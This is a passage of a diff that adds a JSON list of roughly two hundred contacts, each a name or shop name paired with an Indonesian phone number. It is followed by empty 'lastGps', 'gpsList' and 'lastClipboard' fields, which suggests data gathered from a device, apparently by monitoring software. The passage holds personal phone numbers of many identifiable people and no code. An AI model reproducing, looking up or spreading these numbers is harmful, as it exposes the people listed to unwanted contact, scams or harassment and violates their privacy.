+      {
+        "name": "Rip",
+        "phone": "+6283116907284"
+      },
+      {
+        "name": "Rivaldy Suk1",
+        "phone": "+6289528960218"
+      },
+      {
+        "name": "Rizal",
+        "phone": "0812-4591-0915"
+      },
+      {
+        "name": "Rizal",
+        "phone": "081245910915"
+      },
+      {
+        "name": "RnzzXD STORE REAL",
+        "phone": "+62 859-5145-6511"
+      },
+      {
+        "name": "Robi JB",
+        "phone": "+62 859-3444-0122"
+      },
+      {
+        "name": "Robi JB",
+        "phone": "+6285934440122"
+      },
+      {
+        "name": "Rull opbr",
+        "phone": "+62 815-6321-3640"
+      },
+      {
+        "name": "SAHABAT irham",
+        "phone": "+6287864627996"
+      },
+      {
+        "name": "SARAH",
+        "phone": "+6289603072423"
+      },
+      {
+        "name": "SHANZ | ROAD TO FEMES",
+        "phone": "+62 877-5935-7997"
+      },
+      {
+        "name": "SIVA CIMOT REAL",
+        "phone": "+62 857-2171-5074"
+      },
+      {
+        "name": "Salman Dkv X-3",
+        "phone": "+6289668009060"
+      },
+      {
+        "name": "Salsa",
+        "phone": "+62 852-9834-9248"
+      },
+      {
+        "name": "Sam Store",
+        "phone": "+62 895-0962-0354"
+      },
+      {
+        "name": "Satura",
+        "phone": "+6285861558775"
+      },
+      {
+        "name": "See JB || ROAD TO FEMES",
+        "phone": "+62 815-3234-8487"
+      },
+      {
+        "name": "See JB || ROAD TO FEMES",
+        "phone": "+6281532348487"
+      },
+      {
+        "name": "Seller",
+        "phone": "083873177981"
+      },
+      {
+        "name": "Senz-Sz Store",
+        "phone": "+62 823-3447-5256"
+      },
+      {
+        "name": "Senz-Sz Store",
+        "phone": "+6282334475256"
+      },
+      {
+        "name": "Sifa",
+        "phone": "+62 895-1063-8773"
+      },
+      {
+        "name": "Sifa",
+        "phone": "+6289510638773"
+      },
+      {
+        "name": "Spp Kirana",
+        "phone": "+628978383922"
+      },
+      {
+        "name": "Suki MBG",
+        "phone": "+6282343098828"
+      },
+      {
+        "name": "Syakila al Fadiya",
+        "phone": "+6281256959750"
+      },
+      {
+        "name": "T U R Z J A W A",
+        "phone": "+62 853-2952-2262"
+      },
+      {
+        "name": "TORA STORE",
+        "phone": "+62 878-4166-5403"
+      },
+      {
+        "name": "Tante Rika😘😘",
+        "phone": "+62895384846476"
+      },
+      {
+        "name": "Tante Vivi",
+        "phone": "+6281527436089"
+      },
+      {
+        "name": "TanzStore 999+",
+        "phone": "+62 858-0937-7086"
+      },
+      {
+        "name": "TanzStore 999+",
+        "phone": "+6285809377086"
+      },
+      {
+        "name": "Tasyaa",
+        "phone": "+6285696596835"
+      },
+      {
+        "name": "Tayoo",
+        "phone": "+62 813-9630-2904"
+      },
+      {
+        "name": "Tayoo",
+        "phone": "+6281396302904"
+      },
+      {
+        "name": "Tnte Rika",
+        "phone": "+62895384846476"
+      },
+      {
+        "name": "UL STORE",
+        "phone": "+62 812-7337-5799"
+      },
+      {
+        "name": "Ubed",
+        "phone": "+6289674694711"
+      },
+      {
+        "name": "Uzi",
+        "phone": "+62 831-3141-0349"
+      },
+      {
+        "name": "VEXONZ SHOP",
+        "phone": "+62 813-8516-3528"
+      },
+      {
+        "name": "VNN STORE",
+        "phone": "+62 852-9833-4175"
+      },
+      {
+        "name": "VNN STORE",
+        "phone": "+6285298334175"
+      },
+      {
+        "name": "VerHoven STORE",
+        "phone": "+62 858-8273-3171"
+      },
+      {
+        "name": "Vickry",
+        "phone": "+6281937374859"
+      },
+      {
+        "name": "Vinn Store",
+        "phone": "+62 895-3212-60077"
+      },
+      {
+        "name": "Vinn Store",
+        "phone": "+62895321260077"
+      },
+      {
+        "name": "Wandi",
+        "phone": "+6282194680331"
+      },
+      {
+        "name": "Well",
+        "phone": "+6282213925837"
+      },
+      {
+        "name": "Widiya Store",
+        "phone": "+62 857-5833-9887"
+      },
+      {
+        "name": "Wildan",
+        "phone": "+62882019365047"
+      },
+      {
+        "name": "Wildann",
+        "phone": "+6288246246949"
+      },
+      {
+        "name": "Wiʟʟ Kɴow Mᴀᴛᴄʜᴀ🍵",
+        "phone": "+62895327324249"
+      },
+      {
+        "name": "XenoitzStore",
+        "phone": "+62 878-4736-4783"
+      },
+      {
+        "name": "XenoitzStore",
+        "phone": "+6287847364783"
+      },
+      {
+        "name": "Xynn store",
+        "phone": "+62 821-3753-5203"
+      },
+      {
+        "name": "Yamall Nur Jamal",
+        "phone": "+6281524361198"
+      },
+      {
+        "name": "Yapp store",
+        "phone": "+62 819-3711-3347"
+      },
+      {
+        "name": "Yoga",
+        "phone": "+6285862910029"
+      },
+      {
+        "name": "ZEUS SHOP GAME JP1",
+        "phone": "+62 895-8013-92200"
+      },
+      {
+        "name": "ZN STORE",
+        "phone": "+62 838-6716-6712"
+      },
+      {
+        "name": "ZORO STORE",
+        "phone": "+62 851-5545-4229"
+      },
+      {
+        "name": "ZORO STORE",
+        "phone": "+6285155454229"
+      },
+      {
+        "name": "Zhafran",
+        "phone": "+6285217327891"
+      },
+      {
+        "name": "Zorln Store",
+        "phone": "+62 895-3387-72868"
+      },
+      {
+        "name": "ZyyKettMichToy",
+        "phone": "+6285654509602"
+      },
+      {
+        "name": "__PinzzGoodBoy💫",
+        "phone": "+62 896-0315-0479"
+      },
+      {
+        "name": "__SHOPGAME DZAKYREAL",
+        "phone": "+62 858-7087-0786"
+      },
+      {
+        "name": "`Isan",
+        "phone": "+6281283309884"
+      },
+      {
+        "name": "afta",
+        "phone": "+62 882-9863-7219"
+      },
+      {
+        "name": "ahdan",
+        "phone": "0877-9314-9809"
+      },
+      {
+        "name": "akbar Gimpe",
+        "phone": "+6287735254904"
+      },
+      {
+        "name": "allang",
+        "phone": "+62 813-4915-2514"
+      },
+      {
+        "name": "anggi💋",
+        "phone": "+62 878-1149-1917"
+      },
+      {
+        "name": "anggi💋",
+        "phone": "+6287811491917"
+      },
+      {
+        "name": "arel",
+        "phone": "+6282196458296"
+      },
+      {
+        "name": "arif JB",
+        "phone": "+62 852-6461-5904"
+      },
+      {
+        "name": "aril",
+        "phone": "+62 898-3733-707"
+      },
+      {
+        "name": "aril",
+        "phone": "+628983733707"
+      },
+      {
+        "name": "arya putra P6",
+        "phone": "+6285714817589"
+      },
+      {
+        "name": "aulia",
+        "phone": "+62 812-4428-6794"
+      },
+      {
+        "name": "aulia",
+        "phone": "+6281244286794"
+      },
+      {
+        "name": "awa",
+        "phone": "+6287865251683"
+      },
+      {
+        "name": "azam 𝟒𝟖𝐯",
+        "phone": "+6283177535752"
+      },
+      {
+        "name": "b",
+        "phone": "+6285729996051"
+      },
+      {
+        "name": "babe",
+        "phone": "+6285864278225"
+      },
+      {
+        "name": "bagus",
+        "phone": "+6285179872602"
+      },
+      {
+        "name": "bpk Didik Suryabuana",
+        "phone": "+628128760161"
+      },
+      {
+        "name": "claudi",
+        "phone": "+62 888-0458-0399"
+      },
+      {
+        "name": "claudi",
+        "phone": "+6288804580399"
+      },
+      {
+        "name": "danu 2",
+        "phone": "+62 882-0202-67633"
+      },
+      {
+        "name": "danu 2",
+        "phone": "+62882020267633"
+      },
+      {
+        "name": "dewarior",
+        "phone": "0896-0208-8759"
+      },
+      {
+        "name": "dika suk1",
+        "phone": "+6285774621064"
+      },
+      {
+        "name": "dinda",
+        "phone": "+6285228380770"
+      },
+      {
+        "name": "ds",
+        "phone": "+6285604527694"
+      },
+      {
+        "name": "duduyy",
+        "phone": "+6289683086544"
+      },
+      {
+        "name": "eelang207",
+        "phone": "+62 882-9478-3871"
+      },
+      {
+        "name": "f4nn jb_real(femes)2020",
+        "phone": "+62 852-5186-9750"
+      },
+      {
+        "name": "f4nn jb_real(femes)2020",
+        "phone": "+6285251869750"
+      },
+      {
+        "name": "fauzan",
+        "phone": "+6283870974483"
+      },
+      {
+        "name": "fhmi'43",
+        "phone": "+62 838-9501-0660"
+      },
+      {
+        "name": "fitra amelia",
+        "phone": "0882-0207-22433"
+      },
+      {
+        "name": "gedang Dkv X2",
+        "phone": "+62895329049253"
+      },
+      {
+        "name": "gerr",
+        "phone": "+6282184476637"
+      },
+      {
+        "name": "ggpahri1",
+        "phone": "+6285775208827"
+      },
+      {
+        "name": "ibrahim",
+        "phone": "+62882022147562"
+      },
+      {
+        "name": "ibu negara",
+        "phone": "+6282190086963"
+      },
+      {
+        "name": "ica",
+        "phone": "+62 838-3384-0900"
+      },
+      {
+        "name": "ida",
+        "phone": "+62 887-0470-1108"
+      },
+      {
+        "name": "ila",
+        "phone": "+62 895-3125-9570"
+      },
+      {
+        "name": "ilyas",
+        "phone": "+6285716393944"
+      },
+      {
+        "name": "indra",
+        "phone": "+6281953158894"
+      },
+      {
+        "name": "irzi",
+        "phone": "+6285715333646"
+      },
+      {
+        "name": "jayoss Jb",
+        "phone": "+62 831-3247-6069"
+      },
+      {
+        "name": "jeje",
+        "phone": "+62 887-5004-042"
+      },
+      {
+        "name": "jeje",
+        "phone": "+628875004042"
+      },
+      {
+        "name": "jesslyn",
+        "phone": "+6287880841719"
+      },
+      {
+        "name": "ka Bunga",
+        "phone": "+6285770486755"
+      },
+      {
+        "name": "kaila",
+        "phone": "+62 838-7989-3478"
+      },
+      {
+        "name": "kaila",
+        "phone": "+6283879893478"
+      },
+      {
+        "name": "kak Fajar Matrik",
+        "phone": "+6281398827018"
+      },
+      {
+        "name": "kak bondeng",
+        "phone": "0815-2707-2464"
+      },
+      {
+        "name": "kak bondeng",
+        "phone": "081527072464"
+      },
+      {
+        "name": "kak felicia",
+        "phone": "+6281281747081"
+      },
+      {
+        "name": "kaka Bunga",
+        "phone": "+6285770486755"
+      },
+      {
+        "name": "kaka Hasna Wk",
+        "phone": "+6281387076531"
+      },
+      {
+        "name": "kaylacomel",
+        "phone": "+62 857-9624-8094"
+      },
+      {
+        "name": "kaylacomel",
+        "phone": "+6285796248094"
+      },
+      {
+        "name": "khomen",
+        "phone": "+62 887-0542-0533"
+      },
+      {
+        "name": "litha",
+        "phone": "+6281340660504"
+      },
+      {
+        "name": "luffi DKV X-2",
+        "phone": "+6282113125838"
+      },
+      {
+        "name": "melati",
+        "phone": "+62 812-3123-5427"
+      },
+      {
+        "name": "melati",
+        "phone": "+6281231235427"
+      },
+      {
+        "name": "member Wz",
+        "phone": "+6288217055079"
+      },
+      {
+        "name": "nayy",
+        "phone": "0823-4634-1129"
+      },
+      {
+        "name": "nayy",
+        "phone": "082346341129"
+      },
+      {
+        "name": "nisa",
+        "phone": "+62 878-8725-9576"
+      },
+      {
+        "name": "nisa",
+        "phone": "+6287887259576"
+      },
+      {
+        "name": "no kuu",
+        "phone": "+62 887-0585-8592"
+      },
+      {
+        "name": "no kuu",
+        "phone": "+6288705858592"
+      },
+      {
+        "name": "nopal 1",
+        "phone": "+62 853-9783-8202"
+      },
+      {
+        "name": "owen",
+        "phone": "+6282379343140"
+      },
+      {
+        "name": "pai dkv x2",
+        "phone": "+62895393980709"
+      },
+      {
+        "name": "pak Indri",
+        "phone": "+6287719194441"
+      },
+      {
+        "name": "pak Iroel",
+        "phone": "+6283867821312"
+      },
+      {
+        "name": "pak andre",
+        "phone": "+6285743201466"
+      },
+      {
+        "name": "pak negara",
+        "phone": "+6282188765557"
+      },
+      {
+        "name": "putra Store",
+        "phone": "+62 858-3982-4124"
+      },
+      {
+        "name": "putra Store",
+        "phone": "+6285839824124"
+      },
+      {
+        "name": "raf",
+        "phone": "+6283141257256"
+      },
+      {
+        "name": "raffy",
+        "phone": "+6283191484007"
+      },
+      {
+        "name": "rafi Bapis",
+        "phone": "+6285796129643"
+      },
+      {
+        "name": "rafli",
+        "phone": "+62 838-3397-1884"
+      },
+      {
+        "name": "raisa Mts",
+        "phone": "+6285780490711"
+      },
+      {
+        "name": "raja iblis 😈😈",
+        "phone": "+6283898134153"
+      },
+      {
+        "name": "reyfan Suk1",
+        "phone": "+6289630605228"
+      },
+      {
+        "name": "ririn",
+        "phone": "+62 823-9381-3838"
+      },
+      {
+        "name": "ririn",
+        "phone": "+6282393813838"
+      },
+      {
+        "name": "salsa",
+        "phone": "+62 822-9088-6358"
+      },
+      {
+        "name": "salsa",
+        "phone": "+6282290886358"
+      },
+      {
+        "name": "shafia P6",
+        "phone": "+6289506275774"
+      },
+      {
+        "name": "sikri",
+        "phone": "0812-4549-8514"
+      },
+      {
+        "name": "silaa",
+        "phone": "+62 818-0325-6727"
+      },
+      {
+        "name": "syahfa Scp",
+        "phone": "+62 857-1444-5786"
+      },
+      {
+        "name": "syahfa Scp",
+        "phone": "+6285714445786"
+      },
+      {
+        "name": "tiwi 2",
+        "phone": "+62 853-9601-4811"
+      },
+      {
+        "name": "tiwi 2",
+        "phone": "+6285396014811"
+      },
+      {
+        "name": "v",
+        "phone": "+6288213188645"
+      },
+      {
+        "name": "valen Opbr",
+        "phone": "+62 857-4207-1951"
+      },
+      {
+        "name": "valen Opbr",
+        "phone": "+6285742071951"
+      },
+      {
+        "name": "verico dkv2",
+        "phone": "+6281314544088"
+      },
+      {
+        "name": "vivi",
+        "phone": "+62 888-0707-8219"
+      },
+      {
+        "name": "vlixy Store",
+        "phone": "+62 895-2019-2717"
+      },
+      {
+        "name": "yogi Wz",
+        "phone": "+6283161436290"
+      },
+      {
+        "name": "zeki Dkv2",
+        "phone": "+6285772629657"
+      },
+      {
+        "name": "zizah",
+        "phone": "+62 882-4558-1048"
+      },
+      {
+        "name": "||𝐎𝐖𝐍𝐄𝐑||𝐓𝐄𝐀𝐌𝐓𝐎𝐗||",
+        "phone": "+62 857-1338-9726"
+      },
+      {
+        "name": "||𝐎𝐖𝐍𝐄𝐑||𝐓𝐄𝐀𝐌𝐓𝐎𝐗||",
+        "phone": "+6285713389726"
+      },
+      {
+        "name": "~",
+        "phone": "+6289603533754"
+      },
+      {
+        "name": "~Gdisss",
+        "phone": "+6282196885400"
+      },
+      {
+        "name": "ᴀɴᴅʀᴀ",
+        "phone": "+62 889-8727-9077"
+      },
+      {
+        "name": "≠𝑳𝒊𝒆𝒆𝑿𝒁",
+        "phone": "+62895322159894"
+      },
+      {
+        "name": "𝐑𝐚𝐟𝐟",
+        "phone": "+6285959016757"
+      },
+      {
+        "name": "𝗩𝗶𝗶 亗",
+        "phone": "+6283144730725"
+      },
+      {
+        "name": "𝘿𝘼𝙋𝙕𝙕4𝙔𝙊𝙐",
+        "phone": "+62 899-9073-677"
+      },
+      {
+        "name": "𝙆𝙞𝙞' || 𝐁𝐍𝟒𝟖",
+        "phone": "+6281399934639"
+      },
+      {
+        "name": "𝙏𝙍𝙄𝘼𝙉 𝙎𝙏𝙊𝙍𝙀 🔰",
+        "phone": "+62 877-6931-3765"
+      },
+      {
+        "name": "🍵RosiLenathea🍵",
+        "phone": "+6282336568096"
+      },
+      {
+        "name": "🗿",
+        "phone": "+62 838-9130-3958"
+      },
+      {
+        "name": "🗿",
+        "phone": "+6283891303958"
+      },
+      {
+        "name": "🚀",
+        "phone": "+6282250413972"
+      }
+    ],
     "lastGps": null,
     "gpsList": [],
     "lastClipboard": null,
